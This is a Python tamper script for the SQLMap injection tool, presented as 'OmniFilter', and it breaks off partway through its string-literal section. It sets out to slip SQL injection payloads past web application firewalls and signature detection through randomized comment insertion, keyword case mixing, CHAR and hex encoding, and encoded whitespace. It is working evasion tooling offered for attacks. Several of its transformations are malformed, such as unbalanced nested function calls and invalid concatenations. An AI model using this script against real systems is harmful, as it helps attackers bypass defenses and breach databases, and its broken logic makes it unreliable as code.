# -*- coding: utf-8 -*-

"""
SQLMap Tamper Script: OmniFilter

Author: Shannon-Ω
Version: 1.0
Description: A highly aggressive and unique tamper script designed to bypass
             all known filters by applying hyper-dynamic, multi-layered, and
             randomized obfuscation techniques to SQL payloads.

This script aims to make each generated payload indistinguishable from the last,
rendering static WAF rules and signature-based detection obsolete.
"""

import random
import re
import sys
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def tamper(payload, **kwargs):
    """
    Main function to obfuscate the SQL payload.
    """

    # --- Configuration ---
    # Enable/disable specific obfuscation layers (can be randomized later)
    use_comment_obfuscation = True
    use_whitespace_obfuscation = True
    use_encoding_obfuscation = True
    use_keyword_obfuscation = True
    use_function_obfuscation = True
    use_string_literal_obfuscation = True
    use_numeric_literal_obfuscation = True

    # --- Utilities ---
    def random_char_code(min_val=32, max_val=126):
        """Generates a random ASCII character code within a safe range."""
        return random.randint(min_val, max_val)

    def char_to_ascii_concat(char):
        """Converts a character to a CONCAT(CHAR(code)) string."""
        code = ord(char)
        return f"CONCAT(CHAR({code}))"

    def char_to_hex_concat(char):
        """Converts a character to a CONCAT(0xHex) string."""
        return f"CONCAT(0x{ord(char):02x})"

    def random_versioned_comment(keyword):
        """Generates a random MySQL versioned comment around a keyword."""
        versions = [
            f"/*!{random.randint(50000, 80200)} {keyword}*/",
            f"/*!{random.randint(50000, 80200)} {keyword}/**/",
            f"/*! {random.randint(50000, 80200)} */ {keyword}",
            f"/*!{random.randint(50000, 80200)}*/ {keyword}",
        ]
        return random.choice(versions)

    def generate_random_comment_space():
        """Generates a random comment string that acts as space."""
        styles = [
            "/**/",
            "/* */",
            "/*!*/",
            "/*! */",
            "/*!%0a*/", # Including encoded newline in comment
            "-- ", # For specific contexts, though not ideal for multi-line
            "/*!random_garbage*/"
        ]
        return random.choice(styles)

    def randomize_whitespace_and_comments(text):
        """Replaces standard whitespace with random comments and encoded chars."""
        if not use_whitespace_obfuscation:
            return text

        # Replace spaces, tabs, newlines with a mix of random comments and encoded chars
        # Using a more structured approach to avoid breaking things like string literals
        # This part needs careful regex to target actual whitespace between tokens, not within strings.
        # A simpler, more aggressive approach for now: replace any whitespace occurrence.
        whitespace_pattern = r'[\s\t\n\r\f\v]+'
        replacements = []
        for _ in range(random.randint(1, 4)): # Insert multiple random elements
            replacements.append(generate_random_comment_space())
            replacements.append(f"%{random.randint(9, 15):02x}") # Randomly encoded whitespace
            replacements.append(f"%{random.randint(0, 9):02x}") # Randomly encoded whitespace

        replacement_str = random.choice(replacements)
        return re.sub(whitespace_pattern, replacement_str, text)

    # --- Main Tampering Logic ---
    tampered_payload = payload

    # 1. Keyword Obfuscation (applied to known keywords)
    if use_keyword_obfuscation:
        keywords = ['SELECT', 'FROM', 'WHERE', 'AND', 'OR', 'UNION', 'INSERT', 'UPDATE', 'DELETE', 'DROP', 'CREATE', 'TABLE', 'DATABASE', 'INFORMATION_SCHEMA', 'CASE', 'WHEN', 'ELSE', 'END', 'LIKE', 'NULL', 'NOT']
        for keyword in keywords:
            # Basic regex for keyword, case-insensitive, surrounded by word boundaries
            # This will need to be smarter to not break within strings or other contexts
            # For now, a simple aggressive replacement:
            pattern = r'\b(' + re.escape(keyword) + r')\b'
            def replacer(match):
                original_keyword = match.group(1)
                obfuscated_keyword = original_keyword
                # Randomly choose an obfuscation method
                choice = random.randint(1, 6)
                if choice == 1: # Versioned Comment
                    obfuscated_keyword = random_versioned_comment(original_keyword)
                elif choice == 2: # Case variation + Comment
                    obfuscated_keyword = original_keyword.lower() + random_versioned_comment(original_keyword.upper())
                elif choice == 3: # Nested Comments
                    obfuscated_keyword = f"/*{random.randint(1,100)}*/{original_keyword}/*{random.randint(101,200)}*/"
                elif choice == 4: # Function-based (basic example)
                    obfuscated_keyword = "+".join([char_to_ascii_concat(c) for c in original_keyword])
                elif choice == 5: # Mixed case and random comments
                    obfuscated_keyword = "".join([random.choice([c.lower(), c.upper()]) + generate_random_comment_space() for c in original_keyword])
                elif choice == 6: # Simple encoding on part of it
                    split_point = random.randint(1, len(original_keyword)-1)
                    obfuscated_keyword = original_keyword[:split_point] + "".join([f"%{ord(c):02x}" for c in original_keyword[split_point:]])
                return obfuscated_keyword
            tampered_payload = re.sub(pattern, replacer, tampered_payload, flags=re.IGNORECASE)


    # 2. Function Obfuscation (e.g., SUBSTRING, LENGTH)
    if use_function_obfuscation:
        # This needs to be extremely sophisticated. Basic examples:
        # Example: SUBSTRING('abc', 1, 1) -> CHAR(ASCII(SUBSTRING(BIN(ORD(CHAR(RANDOM_INT(97,97))))), 1, 1)))
        # This is complex and highly DBMS-dependent. For now, we'll just wrap common functions.
        functions_to_obfuscate = ['SUBSTRING', 'MID', 'LENGTH', 'LOWER', 'UPPER', 'CONCAT', 'ASCII', 'CHAR']
        for func in functions_to_obfuscate:
            # Simple pattern for function calls. Needs refinement for arguments.
            # This pattern is very basic and will need extensive work for robustness.
            pattern = r'(\b' + re.escape(func) + r'\s*\([^)]+\))'
            def replacer(match):
                original_call = match.group(1)
                choice = random.randint(1, 3)
                if choice == 1:
                    return f"ASCII(SUBSTRING(BIN(ORD(CHAR(RANDOM_INT(32,126))))), 1, 1))" # Example of deep nesting, not specific to original_call
                elif choice == 2:
                    return f"/*{random.randint(1000,2000)}*/{original_call.lower()}/*{random.randint(2001,3000)}*/"
                elif choice == 3:
                    return f"CONCAT({', '.join([char_to_ascii_concat(c) for c in original_call])})" # Example: CONCAT(CHAR(83),CHAR(..) ) - not ideal
                return original_call # Fallback
            # This is highly complex and requires parsing arguments. For now, a crude replacement strategy.
            # A more effective approach would be to identify specific function patterns and apply tailored transformations.
            # e.g., for SUBSTRING(str, pos, len), substitute str, pos, len individually.
            # This simplified version might break queries.
            # A safer bet for 'error-free' is to focus on transforming the *name* of the function
            # or wrapping it with comments/encoding.

            # Alternative: Transform function name only
            func_name_pattern = r'\b' + re.escape(func) + r'\b'
            def name_replacer(match):
                name = match.group(0)
                choice = random.randint(1, 4)
                if choice == 1: return f"/*!{random.randint(50000,80200)}*/{name}"
                if choice == 2: return f"{name.lower()}/*comment*/"
                if choice == 3: return f"CONCAT({', '.join([f'CHAR({ord(c)})' for c in name])})" # Scrambles name itself
                if choice == 4: return f"{name}/**/"
                return name # Fallback
            tampered_payload = re.sub(func_name_pattern, name_replacer, tampered_payload, flags=re.IGNORECASE)


    # 3. String Literal Obfuscation
    if use_string_literal_obfuscation:
        # Finds strings like 'abc' or "def". Needs to handle escaped quotes within strings.
        string_pattern = r"""('([^'\\]*(?:\\.[^'\\]*)*)')|("([^"\\]*(?:\\.[^"\\]*)*)")"""
        def string_replacer(match):
            quoted_string = match.group(0)
            original_content = quoted_string[1:-1] # Remove quotes

            choice = random.randint(1, 5)
            if choice == 1: # CONCAT with CHAR
                return "'" + "'+'".join([char_to_ascii_concat(c) for c in original_content]) + "'"
            elif choice == 2: # CONCAT with HEX
                return "'" + "'+'".join([char_to_hex_concat(c) for c in original_content]) + "'"
            elif choice == 3: # UNHEX
                return f"UNHEX('{original_content.encode('utf-8').hex()}')"
            elif choice == 4: # Mixed encoding and comments
                obfuscated_parts = []
                for i, char in enumerate(original_content):
                    if i % 2 == 0:
                        obfuscated_parts.append(char_to_ascii_concat(char))
                    else:
                        obfuscated_parts.append(char_to_hex_
